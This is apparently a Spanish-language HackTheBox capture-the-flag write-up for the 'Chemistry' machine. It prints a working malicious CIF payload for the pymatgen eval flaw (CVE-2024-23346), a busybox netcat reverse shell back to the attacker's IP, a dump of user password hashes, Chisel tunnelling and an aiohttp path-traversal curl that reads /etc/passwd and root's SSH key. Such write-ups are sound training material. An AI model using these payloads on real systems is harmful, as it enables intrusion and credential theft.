---
title: HTB - Chemistry
published: false
categories: [Linux]
tags: [OSCP, eCPPTv3, Fácil]
---


<img src="/assets/HTB/Chemistry/Chemistry.png">


¡Hola!
Vamos a resolver de la máquina `Chemistry` de dificultad "Fácil" de la plataforma [HackTheBox](https://hackthebox.com/).

Técnicas Vistas: 

- **Arbitrary Code Execution (CVE-2024-23346)**
- **SQLite3 Database Enumeration**
- **Cracking Hashes**
- **Remote Port Forwarding (Chisel)**
- **AioHTTP Path Traversal Vulnerability (CVE-2024-23334)**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Chemistry`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Enumeración

* * *

## Nmap

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.10.11.38
PING 10.10.11.38 (10.10.11.38) 56(84) bytes of data.
64 bytes from 10.10.11.38: icmp_seq=1 ttl=63 time=56.8 ms

--- 10.10.11.38 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 56.755/56.755/56.755/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 127 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```ruby
❯ nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.38 -oG allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-09 18:35 CET
Initiating SYN Stealth Scan at 18:35
Scanning 10.10.11.38 [65535 ports]
Discovered open port 22/tcp on 10.10.11.38
Discovered open port 5000/tcp on 10.10.11.38
Completed SYN Stealth Scan at 18:35, 13.07s elapsed (65535 total ports)
Nmap scan report for 10.10.11.38
Host is up, received user-set (0.061s latency).
Scanned at 2024-11-09 18:35:46 CET for 13s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
5000/tcp open  upnp    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.17 seconds
           Raw packets sent: 65560 (2.885MB) | Rcvd: 65575 (2.624MB)
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```ruby
❯ nmap -sCV -p22,5000 10.10.11.38 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-09 18:36 CET
Nmap scan report for 10.10.11.38
Host is up (0.056s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Sat, 09 Nov 2024 17:36:45 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=11/9%Time=672F9DB7%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,38A,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3\
SF:x20Python/3\.9\.5\r\nDate:\x20Sat,\x2009\x20Nov\x202024\x2017:36:45\x20
SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
SF:x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20h
SF:tml>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\
SF:"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"widt
SF:h=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Chemis
SF:try\x20-\x20Home</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x
SF:20href=\"/static/styles\.css\">\n</head>\n<body>\n\x20\x20\x20\x20\n\x2
SF:0\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<div\x20class=
SF:\"container\">\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\"title\">
SF:Chemistry\x20CIF\x20Analyzer</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>W
SF:elcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x20tool\x
SF:20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographic\x20In
SF:formation\x20File\)\x20and\x20analyze\x20the\x20structural\x20data\x20c
SF:ontained\x20within\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class
SF:=\"buttons\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<center>
SF:<a\x20href=\"/login\"\x20class=\"btn\">Login</a>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20<a\x20href=\"/register\"\x20class=\"btn\">Re
SF:gister</a></center>\n\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x
SF:20\x20</div>\n</body>\n<")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUBL
SF:IC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x2
SF:0\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Cont
SF:ent-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\
SF:n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20r
SF:esponse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400<
SF:/p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20v
SF:ersion\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Err
SF:or\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20re
SF:quest\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20<
SF:/body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.38 seconds
```

Observamos que en el puerto `5000` corre un servicio `HTTP` bajo un servidor en Python.

## Web

Accedemos al servicio web y observamos que se trata de un analizador de archivos `CIF (Crystallographic Information File)`. 

<img src="/assets/HTB/Chemistry/web.png">

Nos registramos para acceder al servicio. Nos da la opción de subir un archivo `CIF` para su análisis.

<img src="/assets/HTB/Chemistry/dashboard.png">

## CVE-2024-23346

Buscamos por vulnerabilidades asociadas a archivos `CIF` encontramos el [CVE-2024-23346](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f). Existe una vulnerabilidad de seguridad crítica en el método `JonesFaithfulTransformation.from_transformation_str()` dentro de la biblioteca `pymatgen`. Este método utiliza de forma insegura `eval()` para procesar la entrada, lo que permite la ejecución de código arbitrario al analizar entradas que no son de confianza. Esto se puede aprovechar al analizar un archivo `CIF` creado con fines malintencionados.

Para poder probar si nuestra web es vulnerable creamos un archivo `vuln.cif` con la siguiente estructura.

```java
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("ping 10.10.14.19");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```
Nos ponemos en escucha de trazas `ICMP` con la herramienta `tcpdump` y subimos el archivo malicioso creado. Pulsamos en `View` una vez subido y confirmamos que tenemos capacidad de ejecución remota de comandos.

```bash
❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
19:17:04.219138 IP 10.10.11.38 > 10.10.14.19: ICMP echo request, id 2, seq 1, length 64
19:17:04.219161 IP 10.10.14.19 > 10.10.11.38: ICMP echo reply, id 2, seq 1, length 64
19:17:05.220286 IP 10.10.11.38 > 10.10.14.19: ICMP echo request, id 2, seq 2, length 64
19:17:05.220309 IP 10.10.14.19 > 10.10.11.38: ICMP echo reply, id 2, seq 2, length 64
19:17:06.222581 IP 10.10.11.38 > 10.10.14.19: ICMP echo request, id 2, seq 3, length 64
19:17:06.222598 IP 10.10.14.19 > 10.10.11.38: ICMP echo reply, id 2, seq 3, length 64
```

En este punto cambiamos `ping 10.10.14.19` por `busybox nc 10.10.14.19 443 -e sh` en el archivo malicioso y nos ponemos en escucha en nuestra máquina con netcat. 

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.38] 59338
whoami
app
```

Hemos ganado acceso a la máquina víctima como usuario `app`. Procedemos a realizar el tratamiento de la TTY para tener una Shell plenamente funcional. En el directorio `\home` vemos un usuario `rosa`. Enumerando directorios del usuario `app` localizamos un archivo `database.db` que podría tener información interesante. Nos lo descargamos a nuestra máquina para proceder a examinarlo en detalle.

```bash
❯ sqlite3 database.db
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
structure  user
sqlite> select * from user;
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
.
.
. 
```

Conseguimos el hash del usuario `rosa` entre otros.

## Movimiento Lateral

Con la ayuda de [CrackStation](https://crackstation.net/) conseguimos romper el hash y obtener la contraseña del usuario `rosa`. Confirmamos que es correcta la contraseña. la flag de usuario la localizamos en su carpeta personal.

<img src="/assets/HTB/Chemistry/userflag.png">

## Escalada de Privilegios

Después de enumerar varios puntos observamos que está corriendo un servicio en el localhost de la máquina por el puerto `8080`.

```bash
rosa@chemistry:~$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      2 10.10.11.38:59338       10.10.14.19:443         ESTABLISHED
tcp        1      0 10.10.11.38:5000        10.10.14.19:42582       CLOSE_WAIT 
tcp        0      1 10.10.11.38:53258       8.8.8.8:53              SYN_SENT   
tcp        0      0 10.10.11.38:44456       10.10.14.19:443         ESTABLISHED
tcp        1      0 10.10.11.38:5000        10.10.14.19:52398       CLOSE_WAIT 
tcp        1      0 10.10.11.38:5000        10.10.14.19:37112       CLOSE_WAIT 
tcp6       0      0 :::22                   :::*                    LISTEN    
```

Con [Chisel](https://github.com/jpillora/chisel) aplicaremos Port Forwarding para traernos a nuestra máquina el servicio que corre por el puerto 8080 de la máquina víctima.

`MAQUINA ATACANTE`
```bash
❯ ./chisel server --reverse -p 1234
2024/11/09 19:45:12 server: Reverse tunnelling enabled
2024/11/09 19:45:12 server: Fingerprint ruLKW0yg0PRD+swhlPcebir4JGqiAo0cy/iM+QmJ4wY=
2024/11/09 19:45:12 server: Listening on http://0.0.0.0:1234
2024/11/09 19:46:02 server: session#1: tun: proxy#R:8080=>8080: Listening
```

`MAQUINA VICTIMA`
```bash
rosa@chemistry:/tmp$ ./chisel client 10.10.14.19:1234 R:8080:127.0.0.1:8080
2024/11/09 18:45:52 client: Connecting to ws://10.10.14.19:1234
2024/11/09 18:45:52 client: Connected (Latency 56.350349ms)
```

Ya podemos acceder desde nuestro navegador a `localhost:8080`.

<img src="/assets/HTB/Chemistry/8080.png">

Aplicamos un reconocimiento de la web con `Nikto`.

```bash
❯ nikto -h http://127.0.0.1:8080/
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          127.0.0.1
+ Target Hostname:    127.0.0.1
+ Target Port:        8080
+ Start Time:         2024-11-09 19:47:55 (GMT1)
---------------------------------------------------------------------------
+ Server: Python/3.9 aiohttp/3.9.1
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
```
Observamos el servicio `aiohttp 3.9.1` y buscamos vulnerabilidades asociadas a este servicio y versión. Encontramos que es vulnerable a `Path Traversal`. [CVE-2024-23334](https://github.com/z3rObyte/CVE-2024-23334-PoC). Analizando el script del PoC tartamos de confirmar que es vulnerable tratando de listar el `/etc/passwd`.

```bash
❯ curl --path-as-is http://127.0.0.1:8080/assets/../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
app:x:1001:1001:,,,:/home/app:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```
En este punto que hemos confirmado que es vulnerable podemos listar la clave `id_rsa` del usuario `root`.

<img src="/assets/HTB/Chemistry/idrsa.png">

Nos la copiamos y damos permisos 600 y nos conectamos como `root` a la máquina víctima. La flag de usuario privilegiado se encuentra en su directorio personal.

<img src="/assets/HTB/Chemistry/rootflag.png">

Hemos completado la máquina **Chemistry** de HackTheBox!! Happy Hacking!!

<img src="/assets/HTB/Chemistry/pwned.png">